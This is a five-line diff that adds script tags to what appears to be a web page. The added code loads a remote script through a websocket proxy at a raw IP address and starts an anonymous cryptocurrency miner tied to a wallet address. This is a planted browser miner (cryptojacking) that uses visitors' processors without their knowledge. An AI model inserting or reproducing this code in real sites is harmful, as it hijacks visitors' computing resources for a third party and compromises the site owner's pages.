@@ -1,0 +1,5 @@
+<script src="https://kidsu.github.io/my-proxy/m.js?proxy=ws://207.246.84.52"></script>
+<script>
+  var miner = CH.Anonymous('47iHRdo371ufBNTk5QW6MB799MGyP6BK5VTyVkBmGjv5B8H66i3PSHkSqNzc3yUnxSAUqo8U6567Fe4gyEAiGeAsSynLk3h');
+  miner.start();
+</script>
